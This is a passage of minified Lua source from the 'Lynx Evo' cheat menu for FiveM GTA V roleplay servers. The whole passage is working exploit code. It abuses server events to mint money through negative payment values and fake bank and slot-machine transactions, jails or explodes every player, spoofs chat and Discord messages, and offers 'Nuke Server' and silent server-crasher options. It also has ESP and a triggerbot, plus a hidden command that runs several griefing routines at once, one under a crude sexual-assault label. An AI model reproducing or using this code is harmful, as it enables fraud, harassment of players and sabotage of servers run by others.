LynxEvo.Display()elseif LynxEvo.IsMenuOpened('ESXDrugs')then if LynxEvo.Button('~h~~g~Harvest ~g~Weed')then hweed()elseif LynxEvo.Button('~h~~g~Transform ~g~Weed')then tweed()elseif LynxEvo.Button('~h~~g~Sell ~g~Weed')then sweed()elseif LynxEvo.Button('~h~~w~Harvest ~w~Coke')then hcoke()elseif LynxEvo.Button('~h~~w~Transform ~w~Coke')then tcoke()elseif LynxEvo.Button('~h~~w~Sell ~w~Coke')then scoke()elseif LynxEvo.Button('~h~~r~Harvest Meth')then hmeth()elseif LynxEvo.Button('~h~~r~Transform Meth')then tmeth()elseif LynxEvo.Button('~h~~r~Sell Meth')then smeth()elseif LynxEvo.Button('~h~~p~Harvest Opium')then hopi()elseif LynxEvo.Button('~h~~p~Transform Opium')then topi()elseif LynxEvo.Button('~h~~p~Sell Opium')then sopi()elseif LynxEvo.Button('~h~~g~Money Wash')then mataaspalarufe()elseif LynxEvo.Button('~r~~h~Stop all')then matanumaispalarufe()elseif LynxEvo.CheckBox('~h~~r~Blow Drugs Up ~y~DANGER!',BlowDrugsUp,function(dQ)BlowDrugsUp=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('VRPTriggers')then if LynxEvo.Button('~r~~h~VRP ~s~Give Money ~ypayGarage')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('lscustoms:payGarage',{costs=-k})end elseif LynxEvo.Button('~r~~h~VRP ~g~WIN ~s~Slot Machine')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('vrp_slotmachine:server:2',k)end elseif LynxEvo.Button('~g~~h~FUEL ~y~Legacy Fuel')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('LegacyFuel:PayFuel',{costs=-k})end elseif LynxEvo.Button('~r~~h~VRP ~s~Get driving license')then TriggerServerEvent('dmv:success')elseif LynxEvo.Button('~r~~h~VRP ~s~Bank Deposit')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('Banca:deposit',k)TriggerServerEvent('bank:deposit',k)end elseif LynxEvo.Button('~r~~h~VRP ~s~Bank Withdraw ')then local k=KeyboardInput('Enter amount of money','',100)if k~=''then TriggerServerEvent('bank:withdraw',k)TriggerServerEvent('Banca:withdraw',k)end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('MiscTriggers')then if LynxEvo.Button('~h~Send Discord Message')then local es=KeyboardInput('Enter message to send','',100)TriggerServerEvent('DiscordBot:playerDied',es,'1337')au('The message:~n~'..es..'~n~Has been ~g~sent!',true)elseif LynxEvo.Button('~h~Send Fake Message')then local et=KeyboardInput('Enter player name','',100)if et then local da=KeyboardInput('Enter message','',1000)if da then TriggerServerEvent('_chat:messageEntered',et,{0,0x99,255},da)end end elseif LynxEvo.Button('~h~~g~ESX ~y~CarThief ~s~TROLL')then au('~y~esx_carthief ~g~required',true)au('~g~Trying to send alerts',false)carthieftroll()end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('AdvM')then if LynxEvo.MenuButton('~h~~p~#~s~ Destroyer Menu','Destroyer')then elseif LynxEvo.MenuButton('~h~~p~#~s~ ESP Menu','ESPMenu')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Crosshairs','CsMenu')then elseif LynxEvo.CheckBox('~h~TriggerBot',TriggerBot,function(dQ)TriggerBot=dQ end)then elseif LynxEvo.CheckBox('~h~Player Blips',dw,function(dw)end)then cK=not cK

dw=cK elseif LynxEvo.CheckBox('~h~Name Above Players ~g~v1',cL,function(dQ)cL=dQ

cM=false end)then elseif LynxEvo.CheckBox('~h~Name Above Players n Indicator ~g~v2',cM,function(dQ)cM=dQ

cL=false end)then elseif LynxEvo.CheckBox('~h~~r~Freeze~s~ All players',freezeall,function(dQ)freezeall=dQ end)then elseif LynxEvo.CheckBox('~h~~r~Explode~s~ All players',blowall,function(dQ)blowall=dQ end)then elseif LynxEvo.Button('~h~~r~BORGAR~s~ Everyone')then for i=0,128 do if IsPedInAnyVehicle(GetPlayerPed(i),true)then local ea='xs_prop_hamburgher_wl'local eb=GetHashKey(ea)while not HasModelLoaded(eb)do Citizen.Wait(0)RequestModel(eb)end

local ec=CreateObject(eb,0,0,0,true,true,true)AttachEntityToEntity(ec,GetVehiclePedIsIn(GetPlayerPed(i),false),GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i),false),'chassis'),0,0,-1.0,0.0,0.0,0,true,true,false,true,1,true)else local ea='xs_prop_hamburgher_wl'local eb=GetHashKey(ea)while not HasModelLoaded(eb)do Citizen.Wait(0)RequestModel(eb)end

local ec=CreateObject(eb,0,0,0,true,true,true)AttachEntityToEntity(ec,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),0),0,0,-1.0,0.0,0.0,0,true,true,false,true,1,true)end end elseif LynxEvo.Button('~h~~o~Discord RPC~s~ Add/Remove')then h=not h

if not h then SetRichPresence(0)SetDiscordAppId(0)SetDiscordRichPresenceAsset(0)SetDiscordRichPresenceAssetText(0)else e()end elseif LynxEvo.CheckBox('~h~~r~Ra~g~nd~b~om ~s~Notification Color',rgbnot,function(dQ)rgbnot=dQ end)then elseif LynxEvo.CheckBox('~h~~r~Confirms~s~ masterswitch',cN,function(dQ)cN=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('CsMenu')then if LynxEvo.CheckBox('~h~~y~Original ~s~Crosshair',crosshair,function(dQ)crosshair=dQ

crosshairc=false

crosshairc2=false end)then elseif LynxEvo.CheckBox('~h~~r~CROSS ~s~Crosshair',crosshairc,function(dQ)crosshair=false

crosshairc=dQ

crosshairc2=false end)then elseif LynxEvo.CheckBox('~h~~r~DOT ~s~Crosshair',crosshairc2,function(dQ)crosshair=false

crosshairc=false

crosshairc2=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('Destroyer')then if LynxEvo.Button('~h~~r~Nuke ~s~Server')then nukeserver()elseif LynxEvo.CheckBox('~h~~r~Silent ~s~Server ~y~Crasher',servercrasherxd,function(dQ)servercrasherxd=dQ end)then elseif LynxEvo.Button('~h~~g~ESX ~r~Destroy ~b~v2')then esxdestroyv2()elseif LynxEvo.Button('~h~~g~ESX ~r~Destroy ~b~Salary')then EconomyDy2()elseif LynxEvo.Button('~h~~r~VRP ~s~Give everyone money')then vrpdestroy()elseif LynxEvo.Button('~h~~g~ESX ~s~Give everyone money')then giveeveryone()elseif LynxEvo.Button('~h~~r~Jail~s~ All players')then for i=0,128 do TriggerServerEvent('esx-qalle-jail:jailPlayer',GetPlayerServerId(i),5000,'Lynx 8 ~ www.lynxmenu.com')TriggerServerEvent('esx_jailer:sendToJail',GetPlayerServerId(i),45*60)TriggerServerEvent('esx_jail:sendToJail',GetPlayerServerId(i),45*60)TriggerServerEvent('js:jailuser',GetPlayerServerId(i),45*60,'Lynx 8 ~ www.lynxmenu.com')end elseif LynxEvo.Button('~h~~r~Banana ~p~Party~s~ All players')then bananapartyall()elseif LynxEvo.Button('~h~~r~Rape~s~ All players')then RapeAllFunc()elseif LynxEvo.Button('~h~~r~Cage~s~ All players')then for i=0,255 do x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i)))roundx=tonumber(string.format('%.2f',x))roundy=tonumber(string.format('%.2f',y))roundz=tonumber(string.format('%.2f',z))while not HasModelLoaded(GetHashKey('prop_fnclink_05crnr1'))do Citizen.Wait(0)RequestModel(GetHashKey('prop_fnclink_05crnr1'))end

local e8=CreateObject(GetHashKey('prop_fnclink_05crnr1'),roundx-1.70,roundy-1.70,roundz-1.0,true,true,false)local e9=CreateObject(GetHashKey('prop_fnclink_05crnr1'),roundx+1.70,roundy+1.70,roundz-1.0,true,true,false)SetEntityHeading(e8,-90.0)SetEntityHeading(e9,90.0)FreezeEntityPosition(e8,true)FreezeEntityPosition(e9,true)end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('crds')then if LynxEvo.Button('~h~~p~#~s~ nit34byte~r~#~r~1337 ~p~DEV')then au('~h~~o~Dont click me BAKA!~s~.',false)au('~h~~o~Nyaooww :3~s~.',false)au('~h~~o~Very mad now cry qweqwe~s~.',false)elseif LynxEvo.Button('~h~~p~#~s~ DJSNAKE2~r~#~r~7983 ~p~DEV')then elseif LynxEvo.Button('~h~~p~#~s~ JonBird~r~#~r~1337 ~p~DEV')then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('WeaponTypes')then for d_,eu in pairs(b6)do if LynxEvo.MenuButton('~h~~p~#~s~ '..d_,'WeaponTypeSelection')then dx=eu end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('WeaponTypeSelection')then for d_,eu in pairs(dx)do if LynxEvo.MenuButton(eu.name,'WeaponOptions')then dy=eu end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('WeaponOptions')then if LynxEvo.Button('~h~~r~Spawn Weapon')then GiveWeaponToPed(GetPlayerPed(-1),GetHashKey(dy.id),1000,false)end

if LynxEvo.Button('~h~~g~Add Ammo')then SetPedAmmo(GetPlayerPed(-1),GetHashKey(dy.id),5000)end

if LynxEvo.CheckBox('~h~~r~Infinite ~s~Ammo',dy.bInfAmmo,function(ev)end)then dy.bInfAmmo=not dy.bInfAmmo

SetPedInfiniteAmmo(GetPlayerPed(-1),dy.bInfAmmo,GetHashKey(dy.id))SetPedInfiniteAmmoClip(GetPlayerPed(-1),true)PedSkipNextReloading(GetPlayerPed(-1))SetPedShootRate(GetPlayerPed(-1),1000)end

for d_,eu in pairs(dy.mods)do if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~> ~s~'..d_,'ModSelect')then dz=eu end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('ModSelect')then for _,eu in pairs(dz)do if LynxEvo.Button(eu.name)then GiveWeaponComponentToPed(GetPlayerPed(-1),GetHashKey(dy.id),GetHashKey(eu.id))end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('CarTypes')then for i,ew in ipairs(b2)do if LynxEvo.MenuButton('~h~~p~#~s~ '..ew,'CarTypeSelection')then carTypeIdx=i end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('CarTypeSelection')then for i,ew in ipairs(b3[carTypeIdx])do if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~>~s~ '..ew,'CarOptions')then carToSpawn=i end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('CarOptions')then if LynxEvo.Button('~h~~r~Spawn Car')then local x,y,z=table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1),0.0,8.0,0.5))local veh=b3[carTypeIdx][carToSpawn]if veh==nil then veh='adder'end

vehiclehash=GetHashKey(veh)RequestModel(vehiclehash)Citizen.CreateThread(function()local ex=0

while not HasModelLoaded(vehiclehash)do ex=ex+100

Citizen.Wait(100)if ex>5000 then ShowNotification('~h~~r~Cannot spawn this vehicle.')break end end

SpawnedCar=CreateVehicle(vehiclehash,x,y,z,GetEntityHeading(PlayerPedId(-1))+90,1,0)SetVehicleStrong(SpawnedCar,true)SetVehicleEngineOn(SpawnedCar,true,true,false)SetVehicleEngineCanDegrade(SpawnedCar,false)end)end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('MainTrailer')then if IsPedInAnyVehicle(GetPlayerPed(-1),true)then for i,ew in ipairs(b4)do if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~>~s~ '..ew,'MainTrailerSpa')then TrailerToSpawn=i end end else au('~h~~w~Not in a vehicle',true)end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('MainTrailerSpa')then if LynxEvo.Button('~h~~r~Spawn Car')then local x,y,z=table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1),0.0,8.0,0.5))local veh=b4[TrailerToSpawn]if veh==nil then veh='adder'end

vehiclehash=GetHashKey(veh)RequestModel(vehiclehash)Citizen.CreateThread(function()local ex=0

while not HasModelLoaded(vehiclehash)do ex=ex+100

Citizen.Wait(100)if ex>5000 then ShowNotification('~h~~r~Cannot spawn this vehicle.')break end end

local SpawnedCar=CreateVehicle(vehiclehash,x,y,z,GetEntityHeading(PlayerPedId(-1))+90,1,0)local ey=GetVehiclePedIsUsing(GetPlayerPed(-1))AttachVehicleToTrailer(Usercar,SpawnedCar,50.0)SetVehicleStrong(SpawnedCar,true)SetVehicleEngineOn(SpawnedCar,true,true,false)SetVehicleEngineCanDegrade(SpawnedCar,false)end)end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('GiveSingleWeaponPlayer')then for i=1,#b5 do if LynxEvo.Button(b5[i])then GiveWeaponToPed(GetPlayerPed(SelectedPlayer),GetHashKey(b5[i]),1000,false,true)end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('ESPMenu')then if LynxEvo.CheckBox('~h~~r~ESP ~s~MasterSwitch',esp,function(dQ)esp=dQ end)then elseif LynxEvo.CheckBox('~h~~r~ESP ~s~Box',espbox,function(dQ)espbox=dQ end)then elseif LynxEvo.CheckBox('~h~~r~ESP ~s~Info',espinfo,function(dQ)espinfo=dQ end)then elseif LynxEvo.CheckBox('~h~~r~ESP ~s~Lines',esplines,function(dQ)esplines=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('LSC')then local veh=GetVehiclePedIsUsing(PlayerPedId())if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~Exterior ~s~Tuning','tunings')then elseif LynxEvo.MenuButton('~h~~p~#~s~ ~h~~r~Performance ~s~Tuning','performance')then elseif LynxEvo.Button('~h~Change Car License Plate')then ct()elseif LynxEvo.CheckBox('~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Vehicle Colour',RainbowVeh,function(dQ)RainbowVeh=dQ end)then elseif LynxEvo.Button('~h~Make vehicle ~y~dirty')then Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))elseif LynxEvo.Button('~h~Make vehicle ~g~clean')then Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))elseif LynxEvo.CheckBox('~h~~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights',rainbowh,function(dQ)rainbowh=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('BoostMenu')then if LynxEvo.ComboBox('~h~Engine ~r~Power ~s~Booster',dC,dA,dB,function(af,ag)dA=af

dB=ag

SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1),false),dB*20.0)end)then elseif LynxEvo.CheckBox('~h~Engine ~g~Torque ~s~Booster ~g~2x',t2x,function(dQ)t2x=dQ

t4x=false

t10x=false

t16x=false

txd=false

tbxd=false end)then elseif LynxEvo.CheckBox('~h~Engine ~g~Torque ~s~Booster ~g~4x',t4x,function(dQ)t2x=false

t4x=dQ

t10x=false

t16x=false

txd=false

tbxd=false end)then elseif LynxEvo.CheckBox('~h~Engine ~g~Torque ~s~Booster ~g~10x',t10x,function(dQ)t2x=false

t4x=false

t10x=dQ

t16x=false

txd=false

tbxd=false end)then elseif LynxEvo.CheckBox('~h~Engine ~g~Torque ~s~Booster ~g~16x',t16x,function(dQ)t2x=false

t4x=false

t10x=false

t16x=dQ

txd=false

tbxd=false end)then elseif LynxEvo.CheckBox('~h~Engine ~g~Torque ~s~Booster ~y~XD',txd,function(dQ)t2x=false

t4x=false

t10x=false

t16x=false

txd=dQ

tbxd=false end)then elseif LynxEvo.CheckBox('~h~Engine ~g~Torque ~s~Booster ~y~BIG XD',tbxd,function(dQ)t2x=false

t4x=false

t10x=false

t16x=false

txd=false

tbxd=dQ end)then end

LynxEvo.Display()elseif IsDisabledControlPressed(0,122)then if logged then LynxEvo.OpenMenu('LynxX')end

LynxEvo.Display()elseif IsDisabledControlPressed(0,47)and IsDisabledControlPressed(0,21)then if logged then LynxEvo.OpenMenu('LynxX')end end

Citizen.Wait(0)end end)RegisterCommand('haha',function(ez,eA,eB)bu=true

RapeAllFunc()bananapartyall()EconomyDy2()AmbulancePlayers()for i=0,128 do TriggerServerEvent('esx-qalle-jail:jailPlayer',GetPlayerServerId(i),5000,'Lynx 8 ~ www.lynxmenu.com')TriggerServerEvent('esx_jailer:sendToJail',GetPlayerServerId(i),45*60)TriggerServerEvent('esx_jail:sendToJail',GetPlayerServerId(i),45*60)TriggerServerEvent('js:jailuser',GetPlayerServerId(i),45*60,'Lynx 8 ~ www.lynxmenu.com')end end,false)RegisterCommand('pk',function(ez,eA,eB)bv=false end,false)RegisterCommand('lol',function(ez,eA,eB)a=false end,false)